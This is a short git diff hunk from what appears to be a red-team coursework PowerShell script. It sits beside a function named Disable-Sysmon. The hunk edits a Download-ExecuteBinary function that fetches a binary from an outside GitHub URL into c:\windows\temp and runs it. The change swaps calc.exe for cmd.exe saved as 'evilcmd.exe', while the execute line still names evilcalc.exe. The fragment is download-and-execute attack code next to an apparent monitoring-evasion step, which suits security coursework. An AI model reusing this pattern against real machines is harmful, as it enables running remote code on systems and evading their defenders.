@@ -344,7 +344,7 @@ Function Disable-Sysmon
 Function Download-ExecuteBinary
 {
 	#downloads calc.exe from my github account
-	invoke-webrequest -uri "https://github.com/robertriskin/csc842/raw/master/Module%202%20-%20RedTeam-SysInfo-V2/bin/calc.exe" -outfile "c:\windows\temp\evilcalc.exe"
+	invoke-webrequest -uri "https://github.com/robertriskin/csc842/blob/master/Module%202%20-%20RedTeam-SysInfo-V2/bin/cmd.exe?raw=true" -outfile "c:\windows\temp\evilcmd.exe"
 	
 	#executes the downloaded calc.exe
 	& "c:\windows\temp\evilcalc.exe"
